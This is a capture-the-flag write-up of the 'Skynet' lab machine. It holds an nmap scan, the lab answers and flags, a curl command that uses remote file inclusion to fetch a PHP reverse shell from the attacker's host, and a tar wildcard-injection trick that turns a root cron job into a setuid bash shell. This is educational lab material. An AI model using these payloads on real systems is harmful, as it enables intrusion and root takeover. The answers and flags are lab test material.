# Skynet 

> Lorenzo De Simone | 17.12.2022 

------------------------------------------

## Hosts 

```bash
export IP=10.10.52.194 
```

## Enumeration 

```
$ sudo nmap -sC -sV -oN nmap/initial 10.10.52.194
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 07:29 CET
Nmap scan report for 10.10.52.194
Host is up (0.035s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE PIPELINING SASL CAPA TOP RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ENABLE LOGIN-REFERRALS SASL-IR LOGINDISABLEDA0001 more ID have IDLE post-login listed capabilities Pre-login IMAP4rev1 OK LITERAL+
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 10h48m28s, deviation: 3h27m50s, median: 8h48m28s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2022-12-17T15:17:49
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-12-17T09:17:49-06:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.63 seconds

```

## Flags 

1. What is Miles password for his emails?
> cyborg007haloterminator

```
Samba enumeration revelead a share milsedyson => Suggesting username for Miles 
In the anonymous share there was a log file with what looked like passwords 
```


2. What is the hidden directory? 
> /45kra24zxs28v3yd

```
Found in milesdyson smb share
```


3. What is the vulnerability called when you can include a remote file for malicious purposes?
> Remote file inclusion

```
Remote file inclusion vulnerability in cuppaCMS allowed to spawn a reverse shell to target machine 

curl http://10.10.52.194/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php\?urlConfig\=http://10.8.48.50:8000/php-reverse-shell.php

```


4. What is the user flag?
> 7ce5c2109a40f958099283600a9ae807


5. What is the root flag?
>3f0372db24753accc7179a282cd6a949

```
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )



www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Since backup.sh is running every minute with a cronjob as `root` we can let the script run other code abusing the wildcard in the tar command.

```bash
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > '--checkpoint-action=exec=sh shell.sh'
echo "" > --checkpoint=1

/bin/bash -p 
```

Pasting this code in `var/wwww/html` will generate the script `shell.sh`. This script will set the `setuid` flag to /bin/bash allowing us call `/bin/bash` as the owner of the file which is `root` hence giving us a `root shell` 
